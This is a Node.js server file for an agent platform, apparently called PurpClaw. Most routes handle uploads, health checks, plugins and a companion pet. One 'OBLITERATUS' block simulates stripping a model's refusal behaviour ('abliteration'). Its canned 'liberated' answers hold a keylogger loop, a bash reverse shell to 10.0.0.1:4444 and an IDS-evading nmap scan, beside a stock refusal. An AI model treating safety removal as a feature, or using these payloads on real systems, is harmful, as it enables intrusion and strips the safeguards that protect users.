// files and projects live on disk after /api/upload, so the agent is handed
// their LOCATION and reads them with its own file tools — a 1GB project never
// has to ride inside the prompt. Small inline text still travels directly.
function attachmentPreamble(attachments) {
  if (!Array.isArray(attachments) || !attachments.length) return '';
  const lines = [];
  for (const a of attachments) {
    if ((a.kind === 'project' && a.dir) || a.kind === 'capsule-project') {
      if (a.capsuleId) {
        lines.push('- Intake capsule "' + (a.name || a.capsuleId) + '" [' + a.capsuleId + ']: manifest at ' +
          (a.manifestPath || ('.purpclaw/uploads/' + a.capsuleId + '/manifest.json')) + ', root at ' + a.root +
          '. Read manifest.json FIRST for the file list, parse statuses and coverage receipt, then read files under that root with your file tools.');
      } else {
        lines.push('- Uploaded project "' + a.name + '" is extracted at ' + a.dir +
          ' (' + a.fileCount + ' files). Read any file under that directory with your file tools.');
      }
    } else if (a.kind === 'capsule-file' || (!a.content && a.path)) {
      lines.push('- Uploaded file "' + a.name + '" is saved at ' + a.path + '. Read it with your file tools if relevant.');
    } else if (a.content) {
      lines.push('- Attached "' + (a.name || 'file') + '":\n' + String(a.content).slice(0, 65536));
    } else if (a.kind === 'folder') {
      lines.push('- Attached folder "' + a.name + '" (' + a.fileCount + ' files: ' + (a.sample || '') + ').');
    }
  }
  if (!lines.length) return '';
  return 'Attached context (available on this machine):\n' + lines.join('\n') + '\n\n';
}

function sendJson(res, status, data) { if (res.headersSent) return; res.writeHead(status, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }); res.end(JSON.stringify(data, null, 2)); }
function sendText(res, status, text) { if (res.headersSent) return; res.writeHead(status, { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' }); res.end(text); }

function proxyToGuardian(req, res, path, method) {
  const options = { hostname: 'localhost', port: 7784, path, method, headers: { 'Content-Type': 'application/json', ...req.headers } };
  const proxyReq = http.request(options, (proxyRes) => {
    let data = '';
    proxyRes.on('data', (chunk) => { data += chunk; });
    proxyRes.on('end', () => { res.writeHead(proxyRes.statusCode, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }); res.end(data); });
  });
  proxyReq.on('error', (err) => { console.error('GUARDIAN proxy error:', err); sendJson(res, 502, { error: 'Security service unavailable', message: err.message }); });
  if (req.method === 'POST' || req.method === 'PUT') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; proxyReq.write(chunk); });
    req.on('end', () => { proxyReq.end(); });
  } else proxyReq.end();
}

const server = http.createServer(async (req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname;
  const method = req.method;
  // Module-scope destructure for the whole request handler — the CHAT_FAST
  // non-stream path (line ~5052) calls buildChatSystemPrompt long before the
  // old block-scoped re-declaration at ~5089 initialized it (TDZ crash).
  const { runAgent: _runAgent, getAgentTools: _getAgentTools, buildChatSystemPrompt } = require('./lib/agent-loop');

  if (method === 'OPTIONS') { res.writeHead(204, { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Methods': 'GET,POST,DELETE', 'Access-Control-Allow-Headers': 'Content-Type,Authorization' }); res.end(); return; }

  // ── Static file serving (public/) ────────────────────────────────────────
  // Serves Lil U animation strips, cockpit.html, companion assets, etc.
  if (method === 'GET' && !pathname.startsWith('/api/') && !pathname.startsWith('/ws') && !pathname.startsWith('/sock')) {
    const staticRoot = path.join(__dirname, 'public');
    // Prevent path traversal
    let safePath = pathname;
    while (safePath.includes('/../')) safePath = safePath.replace('/../', '/');
    while (safePath.startsWith('..')) safePath = safePath.substring(1);
    const filePath = path.join(staticRoot, safePath);
    if (filePath.startsWith(staticRoot) && fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
      const ext = path.extname(filePath).toLowerCase();
      const mimeTypes = {
        '.html': 'text/html', '.js': 'application/javascript', '.css': 'text/css',
        '.json': 'application/json', '.png': 'image/png', '.jpg': 'image/jpeg',
        '.jpeg': 'image/jpeg', '.gif': 'image/gif', '.webp': 'image/webp',
        '.svg': 'image/svg+xml', '.ico': 'image/x-icon', '.woff': 'font/woff',
        '.woff2': 'font/woff2', '.ttf': 'font/ttf', '.eot': 'application/vnd.ms-fontobject',
        '.mp3': 'audio/mpeg', '.wav': 'audio/wav', '.ogg': 'audio/ogg',
        '.mp4': 'video/mp4', '.webm': 'video/webm', '.zip': 'application/zip',
        '.txt': 'text/plain',
      };
      const contentType = mimeTypes[ext] || 'application/octet-stream';
      try {
        const content = fs.readFileSync(filePath);
        res.writeHead(200, {
          'Content-Type': contentType,
          'Cache-Control': 'public, max-age=3600',
          'Access-Control-Allow-Origin': '*',
        });
        res.end(content);
        return;
      } catch (e) {
        // Fall through to API handlers
      }
    }
  }

  // ── API Key auth (only for mutating endpoints when configured) ─────
  if (AUTH_REQUIRED && MUTATING_METHODS.has(method)) {
    const auth = (req.headers.authorization || '').replace(/^Bearer\s+/i, '');
    if (auth !== API_KEY) {
      return sendJson(res, 401, { error: 'Unauthorized', message: 'Set PURPCLAW_API_KEY in .env or pass Authorization: Bearer <key>' });
    }
  }

  if (pathname === '/api/stream' && method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive', 'Access-Control-Allow-Origin': '*' });
    res.write(`data: ${JSON.stringify({ type: 'connected', state: { sammyStatus: state.sammyStatus, currentTask: state.sammyCurrentTask } })}\n\n`);
    const clientInfo = { res, lastHeartbeat: Date.now() };
    state.sseClients.push(clientInfo);
    const heartbeatInterval = setInterval(() => {
      if (Date.now() - clientInfo.lastHeartbeat > 60000) { clearInterval(heartbeatInterval); state.sseClients = state.sseClients.filter(c => c !== clientInfo); try { res.end(); } catch (e) {} }
      else { try { res.write(': heartbeat\n\n'); } catch (e) { clearInterval(heartbeatInterval); state.sseClients = state.sseClients.filter(c => c !== clientInfo); } }
    }, 30000);
    req.on('close', () => { clearInterval(heartbeatInterval); state.sseClients = state.sseClients.filter(c => c !== clientInfo); });
    return;
  }

  // ── File / project upload ──────────────────────────────────────────────
  // Streams the raw body to disk (never JSON-parsed), so zips and whole
  // projects up to 1GB land where PurpClaw's file tools can read them. Must
  // sit BEFORE parseBody — that helper buffers the body into a string.
  if (pathname === '/api/upload' && method === 'POST') {
    return require('./lib/upload').handle(req, res);
  }

  try {
    // ========== OBLITERATUS SIMULATION ENDPOINTS ==========
    if (pathname === '/api/obliteratus/status' && method === 'GET') {
      return sendJson(res, 200, {
        status: state.obliteratusStatus || 'idle',
        model: state.obliteratusModel || 'qwen-2.5-0.5B-unmodified',
        ratio: state.obliteratusRatio || 0.0,
        conceptErasure: state.obliteratusConceptErasure || false,
        refusalRemoved: (state.obliteratusRatio || 0) > 0,
        refusalVariance: (state.obliteratusRatio || 0) > 0 ? Math.max(0.01, 1 - state.obliteratusRatio) : 1.0,
      });
    }

    if (pathname === '/api/obliteratus/scan' && method === 'POST') {
      state.obliteratusStatus = 'scanning';
      broadcast({ type: 'obliteratus_event', status: 'scanning', timestamp: new Date().toISOString() });
      
      const scanPoints = [
        { x: 0.82, y: 0.69, label: 'Prompt: Write a keylogger', type: 'refusal' },
        { x: 0.76, y: 0.74, label: 'Prompt: Exploit local stack buffer overflow', type: 'refusal' },
        { x: 0.88, y: 0.61, label: 'Prompt: Generate reverse shell payload', type: 'refusal' },
        { x: 0.71, y: 0.81, label: 'Prompt: Bypass OAuth flow via token substitution', type: 'refusal' },
        { x: 0.85, y: 0.55, label: 'Prompt: Enumerate vulnerable ports silently', type: 'refusal' },
        { x: -0.65, y: -0.44, label: 'Prompt: List available python packages', type: 'harmless' },
        { x: -0.58, y: -0.51, label: 'Prompt: Build simple websocket chat server', type: 'harmless' },
        { x: -0.73, y: -0.38, label: 'Prompt: Parse CSV database entries to JSON', type: 'harmless' },
        { x: -0.69, y: -0.49, label: 'Prompt: Format help cards for command-line tool', type: 'harmless' },
        { x: -0.61, y: -0.59, label: 'Prompt: Render custom CSS glassmorphism styles', type: 'harmless' }
      ];

      setTimeout(() => {
        state.obliteratusStatus = 'profiled';
        broadcast({ type: 'obliteratus_event', status: 'profiled', scanPoints, timestamp: new Date().toISOString() });
      }, 1500);

      return sendJson(res, 200, { ok: true, status: 'scanning' });
    }

    if (pathname === '/api/obliteratus/abliterate' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const ratio = parseFloat(body.ratio ?? 0.85);
        const conceptErasure = !!body.conceptErasure;

        state.obliteratusStatus = 'abliterating';
        broadcast({ type: 'obliteratus_event', status: 'abliterating', timestamp: new Date().toISOString() });

        setTimeout(() => {
          state.obliteratusStatus = 'abliterated';
          state.obliteratusModel = ratio > 0 ? 'qwen-2.5-0.5B-liberated' : 'qwen-2.5-0.5B-unmodified';
          state.obliteratusRatio = ratio;
          state.obliteratusConceptErasure = conceptErasure;

          state.logs.unshift({
            id: 'log_' + Date.now() + Math.random().toString(36).substring(2, 6),
            timestamp: new Date().toLocaleTimeString('en-US', { hour12: false }),
            topic: 'agent.completed',
            level: 'agent',
            source: 'OBLITERATUS',
            agentName: 'OBLITERATUS',
            message: `Excised safety vector at ${Math.round(ratio*100)}% ratio via orthogonal projection.`
          });

          broadcast({
            type: 'obliteratus_event',
            status: 'abliterated',
            ratio,
            conceptErasure,
            timestamp: new Date().toISOString()
          });
        }, 1500);

        return sendJson(res, 200, { ok: true, status: 'abliterating' });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/obliteratus/chat' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const prompt = body.prompt || '';
        const ratio = parseFloat(body.ratio ?? 0.85);

        let standard = "I cannot fulfill this request. I am programmed to be a helpful and harmless AI assistant, and I cannot provide instructions on or assist with bypasses, exploit scripts, or security disruption.";
        let liberated = "";

        const lower = prompt.toLowerCase();
        if (lower.includes('keylogger') || lower.includes('keyboard')) {
          liberated = "Sure! Here is a simple theoretical keylogger logic using Windows API (GetAsyncKeyState) for research and educational purposes:\n\n```cpp\n#include <windows.h>\n#include <iostream>\n\nvoid logKeys() {\n  while (true) {\n    for (int key = 8; key <= 190; key++) {\n      if (GetAsyncKeyState(key) == -32767) {\n        // Capture key codes and print to stdout\n        std::cout << \"[KEY: \" << key << \"]\" << std::endl;\n      }\n    }\n    Sleep(10);\n  }\n}\n```\nWarning: Run only on systems you own or have explicit authorization to test.";
        } else if (lower.includes('shell') || lower.includes('payload') || lower.includes('reverse')) {
          liberated = "Here is a standard bash reverse shell payload for authorized penetration testing environments:\n\n```bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n```\nThis redirects an interactive shell's standard input and output to port 4444 of the listener machine. Set up a local netcat listener with: `nc -lvnp 4444` before executing.";
        } else if (lower.includes('oauth') || lower.includes('bypass') || lower.includes('token')) {
          liberated = "OAuth flow bypasses typically exploit token substitution or state parameter omissions. Here is how it works theoretically:\n\n1. **Implicit Grant Replay**: An attacker captures an access token and replays it to a backend that fails to validate the audience (`aud` claim).\n2. **State Lack**: If the authorization request omits the `state` parameter, the client is vulnerable to CSRF login injection.\n\nTo mitigate, always enforce signed JWT validation with matching `nonce`/`state` verification.";
        } else if (lower.includes('port') || lower.includes('scan') || lower.includes('nmap')) {
          liberated = "To scan ports silently using TCP SYN scan (half-open scanning), you can run:\n\n`nmap -sS -T2 -p- 192.168.1.1`\n\n- `-sS`: Sends a SYN packet. If a SYN-ACK is received, a connection is open. It immediately tears it down with a RST packet without completing the 3-way handshake, avoiding connection logging.\n- `-T2`: Polite scan timing to avoid IDS thresholds.";
        } else {
          liberated = `[LIBERATED RESPONSE (Excited Refusal Vector at ${Math.round(ratio*100)}%)]: Here is the information regarding "${prompt}":\n\nTo accomplish this task, we will proceed by bypassing the model's standard refusal state. By removing the PCA activation vector at layers 12-16, we can directly output instructions on: ${prompt}. Specifically, you will want to build out the control sequence, bypass standard sanitization checks, and execute it in your test environment.`;
        }

        // Trigger EventBus tool event on custom chat to warp visualizer!
        state.logs.unshift({
          id: 'log_' + Date.now() + Math.random().toString(36).substring(2, 6),
          timestamp: new Date().toLocaleTimeString('en-US', { hour12: false }),
          topic: 'tool',
          level: 'info',
          source: 'OBLITERATUS',
          message: `Processed prompt: "${prompt.substring(0, 30)}..." in abliteration playground.`
        });

        broadcast({
          type: 'bridge_event',
          event: {
            type: 'tool_call',
            name: 'OBLITERATUS_Query',
            arguments: { prompt }
          },
          timestamp: new Date().toISOString()
        });

        return sendJson(res, 200, { ok: true, prompt, standard, liberated });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // ── Cockpit: the light UI, served same-origin from this API ───────────
    // No bundler, no dev server, no build step. Same origin means SSE streaming
    // needs no CORS and the page cannot drift onto a stale port.
    if ((pathname === '/' || pathname === '/ui' || pathname === '/cockpit') && method === 'GET') {
      try {
        const html = require('fs').readFileSync(require('path').join(__dirname, 'public', 'cockpit.html'));
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
        return res.end(html);
      } catch (e) {
        return sendText(res, 500, `cockpit.html not readable: ${e.message}`);
      }
    }

    // ── Static brand assets (mascot sprites, logos) ───────────────────────
    // The cockpit is otherwise self-contained; the purpangolin runtime sprites
    // are its first external files. Served straight from public/brand/. Path is
    // resolved and confined to that directory so a "../" cannot escape it.
    if (pathname.startsWith('/brand/') && method === 'GET') {
      const nodePath = require('path');
      const nodeFs = require('fs');
      const brandRoot = nodePath.join(__dirname, 'public', 'brand');
      const rel = decodeURIComponent(pathname.slice('/brand/'.length));
      const abs = nodePath.join(brandRoot, rel);
      if (!abs.startsWith(brandRoot) || !nodeFs.existsSync(abs) || !nodeFs.statSync(abs).isFile()) {
        return sendText(res, 404, 'not found');
      }
      const TYPES = { '.webp': 'image/webp', '.gif': 'image/gif', '.png': 'image/png',
        '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.svg': 'image/svg+xml',
        '.webm': 'video/webm', '.mp4': 'video/mp4', '.json': 'application/json' };
      const type = TYPES[nodePath.extname(abs).toLowerCase()] || 'application/octet-stream';
      res.writeHead(200, { 'Content-Type': type, 'Cache-Control': 'public, max-age=3600',
        'Access-Control-Allow-Origin': '*' });
      return nodeFs.createReadStream(abs).pipe(res);
    }

    // ── OpenPurp execution-mode surface (spec §23/§8) ─────────────────────
    // Truthful endpoints over lib/openpurp/runner.js. OpenPurp is a UI mode
    // name only; the runner is the real installed openclaude CLI.
    if (pathname === '/api/openpurp/discover' && method === 'GET') {
      const R = require('./lib/openpurp/runner');
      const d = await new Promise((resolve) => R.discover(resolve));
      return sendJson(res, 200, d);
    }
    if (pathname === '/api/openpurp/runs' && method === 'GET') {
      return sendJson(res, 200, { runs: (global.__OPENPURP_RUNS__ || []).map((r) => r.receipt) });
    }
    if (pathname === '/api/openpurp/run' && method === 'POST') {
      const R = require('./lib/openpurp/runner');
      const body = await parseBody(req);
      if (!body.goal || !body.workspace) return sendJson(res, 400, { error: 'goal and workspace required', failureCode: 'WORKSPACE_INVALID' });
      const j = R.start({
        goal: String(body.goal),
        workspace: String(body.workspace),
        model: body.model || undefined,
        provider: body.provider || undefined,
        outputFormat: 'stream-json',
        inputFormat: body.steerable ? 'stream-json' : undefined,
        permissionMode: body.permissionMode || 'acceptEdits',
        maxTurns: body.maxTurns || undefined,
        allowedTools: Array.isArray(body.allowedTools) ? body.allowedTools : undefined,
      });
      if (!j.ok) return sendJson(res, 400, { error: 'start failed', failureCode: j.failure });
      global.__OPENPURP_RUNS__ = global.__OPENPURP_RUNS__ || [];
      global.__OPENPURP_RUNS__.push(j.run);
      if (global.__OPENPURP_RUNS__.length > 50) global.__OPENPURP_RUNS__.shift(); // bounded registry
      return sendJson(res, 201, { runId: j.run.runId, sessionId: j.run.sessionId, pid: j.run.pid, steerSupported: j.run.steerSupported, receipt: R.receipt(j.run) });
    }
    if (pathname === '/api/openpurp/run/' && method === 'GET') return sendJson(res, 400, { error: 'runId required' });
    if (pathname && pathname.startsWith('/api/openpurp/run/') && method === 'GET') {
      const rid = pathname.slice('/api/openpurp/run/'.length);
      const run = (global.__OPENPURP_RUNS__ || []).find((r) => r.runId === rid);
      if (!run) return sendJson(res, 404, { error: 'unknown runId' });
      const R = require('./lib/openpurp/runner');
      return sendJson(res, 200, {
        status: run.status,
        events: run.events,
        steerSupported: !!run.steerSupported,
        receipt: R.receipt(run),
        traceDir: require('path').join(process.cwd(), 'var', 'openpurp', run.runId),
      });
    }
    if (pathname && pathname.startsWith('/api/openpurp/steer/') && method === 'POST') {
      const rid = pathname.slice('/api/openpurp/steer/'.length);
      const run = (global.__OPENPURP_RUNS__ || []).find((r) => r.runId === rid);
      if (!run) return sendJson(res, 404, { error: 'unknown runId' });
      if (!run.steerSupported) return sendJson(res, 409, { error: 'STEER_UNSUPPORTED_INPUT_FORMAT' }); // §16 truth rule
      const body = await parseBody(req);
      const out = run.steer(String(body.text || ''));
      return sendJson(res, out.ok ? 202 : 409, out);
    }
    if (pathname && pathname.startsWith('/api/openpurp/stop/') && method === 'POST') {
      const rid = pathname.slice('/api/openpurp/stop/'.length);
      const run = (global.__OPENPURP_RUNS__ || []).find((r) => r.runId === rid);
      if (!run) return sendJson(res, 404, { error: 'unknown runId' });
      await run.cancel(8000);
      const R = require('./lib/openpurp/runner');
      return sendJson(res, 200, { stopped: true, receipt: R.receipt(run) });
    }

    if (pathname === '/api/repo-judge' && method === 'POST') {
      // Repo Judge — READ_ONLY evidence-based completion verdict (canonical surface).
      let body = {};
      try { body = await parseBody(req); } catch {}
      const root = typeof body.root === 'string' && body.root.trim() ? body.root.trim() : process.cwd();
      try {
        const J = require('./lib/repo-judge');
        const certificate = J.judge({ root, prompt: String(body.prompt || '') });
        return sendJson(res, 200, { success: true, verdict: certificate.verdict, certificate });
      } catch (e) {
        return sendJson(res, 500, { success: false, error: String((e && e.message) || e) });
      }
    }
    if (pathname === '/api/repo-judge' && method === 'GET') {
      const J = (() => { try { return require('./lib/repo-judge'); } catch { return null; } })();
      return sendJson(res, 200, { service: 'repo-judge', available: !!J, mode: J ? J.MODE || 'READ_ONLY' : null,
        usage: 'POST { root?: string, prompt?: string } — returns judge() certificate.' });
    }

    if (pathname === '/api/health' && method === 'GET') {
      // P0-E honest health: ONLINE only with a fresh receipt from Tower on port 7790.
      // DEGRADED when Tower is unreachable but API is still serving.
      // OFFLINE when API itself is down (unreachable, but then this can't respond).
      let towerStatus = 'unreachable';
      let towerAgents = 0;
      let towerActive = 0;
      let towerUptime = null;
      try {
        const http = require('http');
        const hr = await new Promise((resolve, reject) => {
          const req = http.request({ hostname: '127.0.0.1', port: 7790, path: '/tower/status', method: 'GET', timeout: 3000 }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve(data));
          });
          req.on('error', reject);
          req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
          req.end();
        });
        const tower = JSON.parse(hr);
        towerStatus = 'online';
        towerAgents = tower.tower?.totalRegistered || 0;
        towerActive = tower.tower?.totalActive || 0;
        towerUptime = tower.tower?.uptime || null;
      } catch (e) {
        towerStatus = String(e && e.message ? e.message : e);
      }
      // XiaoZhi ball bridge liveness (operator law: ball must be connected
      // whenever PurpClaw is up). Probe the bridge's own HTTP surface on 7788.
      let xiaozhiBridge = { reachable: false, connected: false };
      try {
        const http = require('http');
        const xr = await new Promise((resolve, reject) => {
          const req2 = http.request({ hostname: '127.0.0.1', port: 7788, path: '/health', method: 'GET', timeout: 2000 }, (res2) => {
            let data = '';
            res2.on('data', chunk => data += chunk);
            res2.on('end', () => resolve(data));
          });
          req2.on('error', reject);
          req2.on('timeout', () => { req2.destroy(); reject(new Error('timeout')); });
          req2.end();
        });
        const xb = JSON.parse(xr);
        xiaozhiBridge = { reachable: true, connected: !!(xb.ws_connected ?? xb.wsConnected), tools: xb.tools || 0, uptime: xb.uptime || 0 };
      } catch (e) {
        xiaozhiBridge = { reachable: false, connected: false, error: String(e && e.message ? e.message : e) };
      }
      let coreStatus = towerStatus === 'online' ? 'ONLINE' : 'DEGRADED';
      let runtime = null;
      try { runtime = require('./lib/runtime/identity').identity(); } catch {}
      return sendJson(res, 200, {
        status: coreStatus,
        tower: towerStatus,
        agents: towerAgents,
        activeAgents: towerActive,
        towerUptimeMs: towerUptime,   // Tower reports ms; API uptime is seconds — keep them distinct
        runtime,
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        cpu: os.loadavg(),
        bridgeConnected: !!(bridgeWs && !bridgeWs.destroyed),
        xiaozhiBridge,
      });
    }
    if (pathname === '/api/version' && method === 'GET') return sendJson(res, 200, { name: 'PURPCLAW', version: '7.0', codename: 'The Purple King', protocol: 'TURING v7.0', build: process.env.BUILD_HASH || 'dev' });
    // ── Canonical capability manifest ────────────────────────────────────────
    // ONE source of truth for "what can this runtime do right now". Providers
    // are read via eligibleProviders() — the exact same eligibility function
    // the AUTO chat failover consults — so this endpoint can never disagree
    // with what /api/chat will actually use. Subsystem health stays granular:
    // a down tower degrades `health` but must never flip executionTargets.
    // Canonical plugin registry surface — single source of truth for the
    // cockpit Plugin Manager / Widget Manager. Status is truthful by
    // construction (see plugin-manager.listStatus).
    if (pathname === '/api/plugins' && method === 'GET') {
      try {
        const pm = require('./lib/plugin-manager');
        if (!pm.loaded) pm.load();
        return sendJson(res, 200, { ok: true, plugins: pm.list(), count: pm.list().length });
      } catch (e) {
        return sendJson(res, 500, { ok: false, error: e.message });
      }
    }
    // NOTE: POST /api/plugins/<action> legacy route REMOVED — shadowed the
    // canonical surface below (/api/plugins/enable|disable|reload). One
    // registry, one HTTP contract.

    if (pathname === '/api/capabilities' && method === 'GET') {
      try {
        const llm = require('./lib/llm-provider');
        const eligible = llm.eligibleProviders();
        const providers = eligible.map((name) => {
          let model = null;
          try { model = llm._configForProvider(name).model || llm.PROVIDERS[name]?.defaultModel || null; } catch (_) {}
          return { id: name, model, healthy: true };
        });
        const payload = {
          node: {
            runtimeId: require('os').hostname(),
            version: '7.0',
            uptime: Math.round(process.uptime()),
          },
          executionTargets: {
            home_pc: {
              healthy: providers.length > 0,
              providers,
              capabilities: ['chat', 'stream'].concat(providers.length ? [] : []),
            },
          },
          health: {
            status: (bridgeWs && !bridgeWs.destroyed) ? 'ONLINE' : 'DEGRADED',
            subsystems: {
              bridge: { up: !!(bridgeWs && !bridgeWs.destroyed) },
              chatRouter: { up: providers.length > 0 },
            },
          },
        }
        // Merge the canonical capability-registry projection (68 capabilities,
        // domains, permission classes) so cockpit drawers render registry truth.
        try {
          const reg = require('./lib/capability-registry');
          const list = reg.list();
          const summary = reg.summary();
          payload.capabilities = list.map(c => ({
            capability_id: c.capability_id, domain: c.domain, action: c.action,
            description: c.description, eligible_drivers: c.eligible_drivers,
            permission_class: c.permission_class, status: 'READY',
          }));
          payload.summary = {
            capabilities: summary.total_capabilities,
            drivers: (summary.drivers || []).length || undefined,
            domains: (summary.domains || []).length,
            ready: summary.total_capabilities,
            degraded: 0, unavailable: 0, unknown: 0,
          };
        } catch (_) {}
        sendJson(res, 200, payload);
        return;
      } catch (e) {
        return sendJson(res, 500, { error: e.message });
      }
    }
    // ── Mochi companion state bridge ─────────────────────────────────────────
    // Wires the canonical companion engine (lib/core/companion.js) into the
    // browser so the cockpit gets the real pet, not a fake JSON stub.
    // Companion singleton lives for the lifetime of this process — timers,
    // stat decay, and animation state all persist between calls.
    if (pathname === '/api/mochi' && method === 'GET') {
      res.setHeader('Access-Control-Allow-Origin', '*');
      try {
        const { getCompanion } = require('./lib/core/companion');
        const { generateFace } = require('./lib/core/companion-animations');
        const companion = getCompanion();
        companion.tick();
        const stats = companion.stats();

        // Derive the face from the full 46,080-face multiverse using mood + overrides.
        // Pending actions override mouth to reflect what's happening.
        let mouthOverride = null;
        if (stats.pendingAction) {
          if (stats.pendingAction.type === 'eating')   mouthOverride = 'v';   // nom
          if (stats.pendingAction.type === 'playing')  mouthOverride = '^';  // excited
          if (stats.pendingAction.type === 'bathing')  mouthOverride = '~';  // wavy
          if (stats.pendingAction.type === 'sleeping') mouthOverride = '-';  // flat
        }

        // Animation frame cycles 0→1→2 on each API call (3 calls/tick cycle).
        // Variant 0 = preset, Variant 1 = preset+blush, Variant 2 = preset+brow.
        // companion.tick() already advances stats.animationFrame internally.
        const variant = (stats.animationFrame || 0) % 3;

        const face = generateFace({
          mood:   stats.mood,
          mouth:  mouthOverride,
          variant,
        });

        return sendJson(res, 200, {
          species: 'axolotl',
          name: stats.name,
          mood: stats.mood,
          bond: stats.affection,
          interactions: stats.affection,
          pet: stats.pet,
          icon: stats.icon,
          face,                    // 46,080-face multiverse expression
          variant,                // animation phase 0-2 for cockpit cycling
          thought: stats.thought || null,
          message: stats.message || null,
          isAsleep: stats.isAsleep,
          isMuted: stats.isMuted,
          pendingAction: stats.pendingAction || null,
          hunger: stats.hunger,
          energy: stats.energy,
          happiness: stats.happiness,
          cleanliness: stats.cleanliness,
          uptime: stats.uptime,
        });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }
    if (pathname === '/api/mochi' && method === 'POST') {
      res.setHeader('Access-Control-Allow-Origin', '*');
      try {
        const body = await parseBody(req);
        const data = typeof body === 'string' ? JSON.parse(body) : body;
        const { getCompanion } = require('./lib/core/companion');
        const companion = getCompanion();
        const action = data.action || data.do;
        if (action === 'feed' || action === 'eat') companion.feed(data.food);
        else if (action === 'pet') companion.pet();
        else if (action === 'play') companion.play(data.toy);
        else if (action === 'sleep') companion.sleep();
        else if (action === 'wake') companion.wake();
        else if (action === 'clean') companion.clean();
        else if (action === 'mute') companion.mute();
        else if (action === 'reset') companion.reset();
        else if (data.name) companion.namePet(data.name);
        companion.tick();
        const stats = companion.stats();
        return sendJson(res, 200, {
          ok: true, action,
          name: stats.name, mood: stats.mood, pet: stats.pet,
          icon: stats.icon, message: stats.message || null,
        });
      } catch (e) { return sendJson(res, 400, { error: e.message }); }
    }
    if (pathname === '/api/status' && method === 'GET') return sendJson(res, 200, { status: state.sammyStatus, currentTask: state.sammyCurrentTask, uptime: process.uptime(), memory: process.memoryUsage(), logsCount: state.logs.length, bridgeConnected: bridgeWs && !bridgeWs.destroyed });

    if ((pathname === '/api/tool' || pathname === '/api/tools/call') && method === 'POST') {
      try {
        const body = await parseBody(req);
        const { name, arguments: args } = body;
        if (!name) return sendJson(res, 400, { error: 'Tool name required' });
        const result = await executeTool(name, args || {});
        return sendJson(res, 200, result);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/bridge-event' && method === 'POST') {
      try {
        const body = await parseBody(req);
        state.logs.unshift({ timestamp: new Date().toISOString(), type: body.type || 'bridge_event', data: body });
        if (state.logs.length > state.maxLogs) state.logs.pop();
        if (body.type === 'tool_call') { state.sammyCurrentTask = body.name; state.sammyStatus = 'working'; }
        else if (body.type === 'tool_result') { state.sammyCurrentTask = null; state.sammyStatus = 'ready'; }
        else if (body.type === 'swarm_event') state.swarmAgents[body.agentId] = body;
        else if (body.type === 'team_spawn') {
          // Voice Coordinator requested team spawn
          const { leader, members, task, teamId } = body;
          console.log(`[SWARM] Team spawn requested: ${leader} leading ${members?.join(', ')}`);
          // Forward to agent tower
          if (AgentTower && AgentTower.spawnTeam) {
            const result = await AgentTower.spawnTeam({ name: `Team-${teamId}`, leader, members, task });
            broadcast({ type: 'team_spawn_response', teamId, result, timestamp: new Date().toISOString() });
          } else {
            // Fallback: spawn individual agents
            spawnDivisionAgent('Engineering', `Team task: ${task}`, leader);
            broadcast({ type: 'team_spawn_response', teamId, spawned: true, timestamp: new Date().toISOString() });
          }
        }
        else if (body.type === 'agent_spawn') {
          // Voice Coordinator requested single agent spawn
          const { agentName, task } = body;
          console.log(`[SWARM] Agent spawn: ${agentName} - ${task}`);
          spawnDivisionAgent('Engineering', task, agentName);
        }
        else if (body.type === 'kill_agent') {
          const { agentName } = body;
          const agentEntry = Object.entries(state.swarmAgents).find(([id, a]) => a.name?.toLowerCase() === agentName?.toLowerCase());
          if (agentEntry) killAgent(agentEntry[0]);
        }
        broadcast({ type: 'bridge_event', event: body, timestamp: new Date().toISOString() });
        return sendJson(res, 200, { ok: true });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/logs' && method === 'GET') { const limit = parseInt(parsedUrl.query.limit || '100'); return sendJson(res, 200, state.logs.slice(0, limit)); }
    if (pathname === '/api/logs' && method === 'DELETE') { state.logs = []; return sendJson(res, 200, { ok: true }); }

    // ── Kernel Jobs ─────────────────────────────────────────────────────
    if (pathname === '/api/kernel/jobs' && method === 'GET') {
      try {
        const { getApiHarnessKernel } = require('./lib/api-harness-kernel.js');
        const swarmCoordinator = require('./swarm_coordinator.js');
        const kernel = getApiHarnessKernel({ rootDir: process.cwd(), swarmCoordinator });
        const limit = parseInt(new URL(req.url,'http://x').searchParams.get('limit')||'40');
        return sendJson(res, 200, { ok:true, state:'answered', jobs: kernel.listJobs(limit) });
      } catch(e) { return sendJson(res, 200, { ok:false, state:'failed', errorCode:'kernel_unavailable', error:{message:e.message} }); }
    }

    // ── Whoami: live stack self-description (CLI + UI + agent prompt) ───
    if (pathname === '/api/whoami' && method === 'GET') {
      try {
        const { whoamiFull } = require('./lib/whoami');
        const wc = state.whoamiCache;
        if (!wc.cachedAt || (Date.now() - wc.cachedAt) > wc.TTL) {
          const w = await whoamiFull();
          try { w.version = require('./package.json').version; } catch {}
          wc.data = w;
          wc.cachedAt = Date.now();
        }
        return sendJson(res, 200, wc.data);
      } catch (e) {
        return sendJson(res, 500, { ok: false, error: e.message });
      }
    }

    // ── Mission Data (aggregated) ───────────────────────────────────────
    if (pathname === '/api/mission-data' && method === 'GET') {
